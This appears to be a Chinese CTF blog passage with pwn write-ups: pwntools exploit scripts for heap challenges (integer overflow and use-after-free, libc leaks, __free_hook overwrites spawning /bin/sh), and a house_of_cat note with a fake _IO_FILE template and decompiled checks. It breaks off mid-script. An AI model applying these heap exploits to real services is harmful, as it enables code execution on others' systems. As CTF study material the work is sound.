<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">banary = &quot;./pwn&quot;</span><br><span class="line">elf = ELF(banary)</span><br><span class="line">#libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">libc=ELF(&quot;/home/youlin/tools/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so&quot;)</span><br><span class="line">ip = &#x27;node4.buuoj.cn&#x27;</span><br><span class="line">port = 29013</span><br><span class="line">local = 1</span><br><span class="line">if local:</span><br><span class="line">    io = process(banary)</span><br><span class="line">else:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)</span><br><span class="line">#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sa = lambda text, data : io.sendafter(text, data)</span><br><span class="line">sla = lambda text, data : io.sendlineafter(text, data)</span><br><span class="line">r = lambda : io.recv()</span><br><span class="line">ru = lambda text : io.recvuntil(text)</span><br><span class="line">uu32 = lambda : u32(io.recvuntil(b&quot;\xff&quot;)[-4:].ljust(4, b&#x27;\x00&#x27;))</span><br><span class="line">uu64 = lambda : u64(io.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;))</span><br><span class="line">iuu32 = lambda : int(io.recv(10),16)</span><br><span class="line">iuu64 = lambda : int(io.recv(12),16)</span><br><span class="line">lg = lambda addr : log.info(addr)</span><br><span class="line">ia = lambda : io.interactive()</span><br><span class="line"></span><br><span class="line">def cmd(choice):</span><br><span class="line">    sla(&quot;Your choice:&quot;,str(choice))</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">    cmd(1)</span><br><span class="line">    sa(&quot;Note size:&quot;,str(size))</span><br><span class="line">    sa(&quot;Note content:&quot;,content)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">    cmd(2)</span><br><span class="line">    sa(&quot;Note ID:&quot;,str(index))</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    cmd(3)</span><br><span class="line">    sa(&quot;Note ID:&quot;,str(index))</span><br><span class="line"></span><br><span class="line">def exit():</span><br><span class="line">    cmd(4)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x80,b&#x27;youlin&#x27;)#0</span><br><span class="line">add(0x80,b&#x27;youlin&#x27;)#1</span><br><span class="line">add(0x200,b&#x27;youlin&#x27;)#2</span><br><span class="line">add(0x200,b&#x27;youlin&#x27;)#3</span><br><span class="line">add(0x80,b&#x27;youlin&#x27;)#4</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">payload=b&#x27;A&#x27;*0x80+p64(0)+p64(0x4B1)</span><br><span class="line">add(0x100000080,payload)# 整数溢出 0</span><br><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line">add(0x80,b&#x27;youlin&#x27;)#1</span><br><span class="line">show(2)</span><br><span class="line">ru(&#x27;Note content:&#x27;)</span><br><span class="line">libcbase=u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))-0x1ebbe0</span><br><span class="line">print(&quot;libcbase:&quot;+hex(libcbase))</span><br><span class="line">system=libcbase+libc.sym[&#x27;system&#x27;]</span><br><span class="line">free_hook=libcbase+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line"></span><br><span class="line">add(0x400,b&#x27;youiln&#x27;)</span><br><span class="line"></span><br><span class="line">delete(1)</span><br><span class="line">payload=b&#x27;A&#x27;*0x80+p64(0)+p64(0x211)</span><br><span class="line">add(0x100000080,payload) # 1</span><br><span class="line"></span><br><span class="line">delete(3)</span><br><span class="line">delete(2)</span><br><span class="line"></span><br><span class="line">delete(1)</span><br><span class="line">payload=b&#x27;A&#x27;*0x80+p64(0)+p64(0x211)+p64(free_hook)</span><br><span class="line">add(0x100000080,payload)    # 1</span><br><span class="line"></span><br><span class="line">add(0x200,b&#x27;/bin/sh\x00&#x27;)    # 2</span><br><span class="line">add(0x200,p64(system)) # 3</span><br><span class="line"></span><br><span class="line">delete(2)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<h2 id="cgrasstring"><a href="#cgrasstring" class="headerlink" title="cgrasstring"></a>cgrasstring</h2><p>c++的pwn(第一次去看)，ida逆出来的代码有点看不懂，只能跟着wp去理解程序逻辑</p>
<p>大概就是可以通过change造成uaf，通过unsortedbin 泄露出libc,然后打free_hook</p>
<p>调试的时候和c语言的堆是差不多的（就是我太菜了，ida逆出来的代码有点看不懂）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">banary = &quot;./cgrasstring&quot;</span><br><span class="line">elf = ELF(banary)</span><br><span class="line">#libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">ip = &#x27;1.14.71.254&#x27;</span><br><span class="line">port = 28581</span><br><span class="line">local = 1</span><br><span class="line">if local:</span><br><span class="line">    io = process(banary)</span><br><span class="line">else:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)</span><br><span class="line">#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sa = lambda text, data : io.sendafter(text, data)</span><br><span class="line">sla = lambda text, data : io.sendlineafter(text, data)</span><br><span class="line">r = lambda : io.recv()</span><br><span class="line">ru = lambda text : io.recvuntil(text)</span><br><span class="line">uu32 = lambda : u32(io.recvuntil(b&quot;\xff&quot;)[-4:].ljust(4, b&#x27;\x00&#x27;))</span><br><span class="line">uu64 = lambda : u64(io.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;))</span><br><span class="line">iuu32 = lambda : int(io.recv(10),16)</span><br><span class="line">iuu64 = lambda : int(io.recv(12),16)</span><br><span class="line">lg = lambda addr : log.info(addr)</span><br><span class="line">ia = lambda : io.interactive()</span><br><span class="line"></span><br><span class="line">def cmd(choice):</span><br><span class="line">    sla(&quot;Your choice:&quot;,str(choice))</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">    cmd(1)</span><br><span class="line">    sla(&quot;size:&quot;,str(size))</span><br><span class="line">    sla(&quot;content:&quot;,content)</span><br><span class="line"></span><br><span class="line">def change(index,size,content):</span><br><span class="line">    cmd(2)</span><br><span class="line">    sla(&quot;idx&quot;,str(index))</span><br><span class="line">    sla(&quot;size&quot;,str(size))</span><br><span class="line">    sa(&quot;content&quot;,content)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    cmd(3)</span><br><span class="line">    sla(&quot;idx&quot;,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(0,8):</span><br><span class="line">    add(0x80,b&quot;/bin/sh\x00&quot;)</span><br><span class="line">for i in range(1,8):</span><br><span class="line">    change(i,0x90,&#x27;\xe0&#x27;)</span><br><span class="line"></span><br><span class="line">show(7)</span><br><span class="line">ru(&#x27;Now you see it:&#x27;)</span><br><span class="line">libcbase=u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))-0x3ebce0</span><br><span class="line">free_hook=libcbase+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">system=libcbase+libc.sym[&#x27;system&#x27;]</span><br><span class="line"></span><br><span class="line">add(0x20,b&#x27;youlin&#x27;)</span><br><span class="line">change(8,0x30,p64(free_hook))</span><br><span class="line">ogg=libcbase+0x4f432</span><br><span class="line">add(0x20,p64(ogg))</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://wscyoulin.github.io/2022/09/14/house-of-cat/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/09/14/house-of-cat/" class="post-title-link" itemprop="url">house_of_cat</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-09-14 20:09:00" itemprop="dateCreated datePublished" datetime="2022-09-14T20:09:00+08:00">2022-09-14</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-09-15 23:49:40" itemprop="dateModified" datetime="2022-09-15T23:49:40+08:00">2022-09-15</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="house-of-cat学习记录"><a href="#house-of-cat学习记录" class="headerlink" title="house_of_cat学习记录"></a>house_of_cat学习记录</h1><p>具体原理：<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-273895.htm#msg_header_h3_6">https://bbs.pediy.com/thread-273895.htm#msg_header_h3_6</a></p>
<h2 id="攻击介绍"><a href="#攻击介绍" class="headerlink" title="攻击介绍"></a>攻击介绍</h2><p>在造成任意地址写一个堆地址的基础上，这里的寄存器rdi（fake_IO的地址）、rax和rdx都是我们可以控制的，在<strong>开启沙箱</strong>的情况下，假如把最后调用的**[rax + 0x18]设置为setcontext，把rdx设置为可控的堆地址，就能执行srop来读取flag<strong>；如果</strong>未开启沙箱<strong>，则只需把</strong>最后调用的[rax + 0x18]设置为system函数，把fake_IO的头部写入/bin/sh字符串**，就可执行system(“/bin/sh”)</p>
<h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><p>1.修改**_IO_list_all<strong>为可控地址（</strong>FSOP<strong>）或修改</strong>stderr<strong>为可控地址(</strong>__malloc_assert**)。<br>2.在上一步的可控地址中伪造<strong>fake_IO结构体</strong>(也可以在任意地址写的情况下修改<strong>stderr、stdout</strong>等结构体)。<br>3.通过<strong>FSOP</strong>或<strong>malloc</strong>触发攻击。</p>
<p>catfly师傅画的图：</p>
<p><img src="https://bbs.pediy.com/upload/attach/202208/959842_JDJKTRK7GJUEUFR.png" alt="图片描述"></p>
<p><strong>模板：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">fake_io_addr=heapbase+0xb00 # 伪造的fake_IO结构体的地址</span><br><span class="line">next_chain = 0</span><br><span class="line">fake_IO_FILE=p64(rdi)         #_flags=rdi</span><br><span class="line">fake_IO_FILE+=p64(0)*7</span><br><span class="line">fake_IO_FILE +=p64(1)+p64(0)</span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+0xb0)#_IO_backup_base=rdx</span><br><span class="line">fake_IO_FILE +=p64(call_addr)#_IO_save_end=call addr(call setcontext/system)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(0x68, &#x27;\x00&#x27;)</span><br><span class="line">fake_IO_FILE += p64(0)  # _chain</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(0x88, &#x27;\x00&#x27;)</span><br><span class="line">fake_IO_FILE += p64(heapbase+0x1000)  # _lock = a writable address</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(0xa0, &#x27;\x00&#x27;)</span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+0x30)#_wide_data,rax1_addr</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(0xc0, &#x27;\x00&#x27;)</span><br><span class="line">fake_IO_FILE += p64(0)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(0xd8, &#x27;\x00&#x27;)</span><br><span class="line">fake_IO_FILE += p64(libcbase+0x2160c0+0x10)  # vtable=IO_wfile_jumps+0x10</span><br><span class="line">fake_IO_FILE +=p64(0)*6</span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+0x40)  # rax2_addr</span><br></pre></td></tr></table></figure>

<h2 id="强网杯：house-of-cat"><a href="#强网杯：house-of-cat" class="headerlink" title="强网杯：house_of_cat"></a>强网杯：house_of_cat</h2><p>个人认为将这道题写的最清楚的一篇文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/tbsqigongzi/article/details/126635738">https://blog.csdn.net/tbsqigongzi/article/details/126635738</a></p>
<p><img src="C:\Users\youlin\AppData\Roaming\Typora\typora-user-images\1663157815912.png" alt="1663157815912"></p>
<p>一道GLIBC 2.35-0ubuntu3开了沙箱的题</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall sub_1A50(char *a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  char *s; // [rsp+18h] [rbp-28h]</span><br><span class="line">  char *v4; // [rsp+20h] [rbp-20h]</span><br><span class="line">  char *v5; // [rsp+20h] [rbp-20h]</span><br><span class="line">  char *v6; // [rsp+20h] [rbp-20h]</span><br><span class="line">  const char *s2; // [rsp+28h] [rbp-18h]</span><br><span class="line">  char *v8; // [rsp+30h] [rbp-10h]</span><br><span class="line">  const char *s1; // [rsp+38h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v4 = strstr(a1, &quot;QWB&quot;);</span><br><span class="line">  if ( !v4 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  *v4 = 0;</span><br><span class="line">  v4[1] = 0;</span><br><span class="line">  v4[2] = 32;</span><br><span class="line">  v5 = v4 + 3;</span><br><span class="line">  s2 = strtok(a1, &quot; &quot;);</span><br><span class="line">  if ( !strcmp(&quot;LOGIN&quot;, s2) )</span><br><span class="line">  &#123;</span><br><span class="line">    *(a2 + 8) = 1;</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( *(a2 + 8) || strcmp(&quot;DOG&quot;, s2) )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( *(a2 + 8) || strcmp(&quot;CAT&quot;, s2) )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( *(a2 + 8) || strcmp(&quot;MONKEY&quot;, s2) )</span><br><span class="line">      &#123;</span><br><span class="line">        if ( *(a2 + 8) || strcmp(&quot;FISH&quot;, s2) )</span><br><span class="line">        &#123;</span><br><span class="line">          if ( *(a2 + 8) || strcmp(&quot;PIG&quot;, s2) )</span><br><span class="line">          &#123;</span><br><span class="line">            if ( *(a2 + 8) || strcmp(&quot;WOLF&quot;, s2) )</span><br><span class="line">            &#123;</span><br><span class="line">              if ( *(a2 + 8) || strcmp(&quot;DUCK&quot;, s2) )</span><br><span class="line">              &#123;</span><br><span class="line">                if ( *(a2 + 8) || strcmp(&quot;GOLF&quot;, s2) )</span><br><span class="line">                &#123;</span><br><span class="line">                  if ( *(a2 + 8) || strcmp(&quot;TIGER&quot;, s2) )</span><br><span class="line">                    return 0LL;</span><br><span class="line">                  *(a2 + 8) = 10;</span><br><span class="line">                &#125;</span><br><span class="line">                else</span><br><span class="line">                &#123;</span><br><span class="line">                  *(a2 + 8) = 9;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">              else</span><br><span class="line">              &#123;</span><br><span class="line">                *(a2 + 8) = 8;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">              *(a2 + 8) = 7;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          else</span><br><span class="line">          &#123;</span><br><span class="line">            *(a2 + 8) = 6;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">          *(a2 + 8) = 5;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        *(a2 + 8) = 4;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      *(a2 + 8) = 3;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    *(a2 + 8) = 2;</span><br><span class="line">  &#125;</span><br><span class="line">  v8 = strtok(0LL, &quot; &quot;);</span><br><span class="line">  if ( v8 != strchr(v8, 124) )</span><br><span class="line">    return 0LL;</span><br><span class="line">  *a2 = v8;</span><br><span class="line">  s1 = strtok(0LL, &quot; &quot;);</span><br><span class="line">  if ( strcmp(s1, &quot;r00t&quot;) )</span><br><span class="line">    return 0LL;</span><br><span class="line">  s = v5 + 5;</span><br><span class="line">  v6 = strstr(v5, &quot;QWXF&quot;);</span><br><span class="line">  if ( !v6 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  *v6 = 0;</span><br><span class="line">  v6[1] = 0;</span><br><span class="line">  v6[2] = 0;</span><br><span class="line">  v6[3] = 32;</span><br><span class="line">  *(a2 + 16) = s;</span><br><span class="line">  return 1LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>要想开始做堆题还得绕过上面这堆判断：LOGIN | r00t QWB QWXFadmin</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall sub_1DF3(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; // rax</span><br><span class="line">  unsigned int v2; // eax</span><br><span class="line">  char *v3; // [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  if ( *(a1 + 8) == 1 &amp;&amp; !strcmp(*(a1 + 16), &quot;admin&quot;) )</span><br><span class="line">    dword_4040[0] = 1;</span><br><span class="line">  result = *(a1 + 8);</span><br><span class="line">  if ( result == 3 )</span><br><span class="line">  &#123;</span><br><span class="line">    result = strtok(*(a1 + 16), &quot;$&quot;);</span><br><span class="line">    v3 = result;</span><br><span class="line">    if ( result )</span><br><span class="line">    &#123;</span><br><span class="line">      result = dword_4014;</span><br><span class="line">      if ( *v3 == dword_4014 )</span><br><span class="line">      &#123;</span><br><span class="line">        result = dword_4040[0];</span><br><span class="line">        if ( dword_4040[0] )</span><br><span class="line">        &#123;</span><br><span class="line">          menu();</span><br><span class="line">          v2 = choice();</span><br><span class="line">          if ( v2 == 4 )</span><br><span class="line">          &#123;</span><br><span class="line">            return sub_1916();</span><br><span class="line">          &#125;</span><br><span class="line">          else</span><br><span class="line">          &#123;</span><br><span class="line">            if ( v2 &lt;= 4 )</span><br><span class="line">            &#123;</span><br><span class="line">              switch ( v2 )</span><br><span class="line">              &#123;</span><br><span class="line">                case 3u:</span><br><span class="line">                  return edit();</span><br><span class="line">                case 1u:</span><br><span class="line">                  return add();</span><br><span class="line">                case 2u:</span><br><span class="line">                  return delete();</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            return sub_12D9(&quot;error!\n&quot;);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后操作堆块的时候还需要先输入：CAT | r00t QWB QWXF$\xff</p>
<p><img src="https://tuchuangs.com/imgs/2022/09/14/2f1bade8876828af.png"></p>
<p>由于题目直接存在uaf，所以可以直接通过unsorted bin泄露libc(其实直接通过largebin也可以直接泄露libc,而且还可以泄露heapbase)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io=process(&#x27;./house_of_cat&#x27;)</span><br><span class="line">#io=remote(&quot;1.14.71.254&quot;,28566)</span><br><span class="line">libc=ELF(&#x27;./libc.so.6&#x27;)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">ra = lambda: io.recvall()</span><br><span class="line">rl = lambda: io.recvline(keepends=True)</span><br><span class="line">ru = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sa = 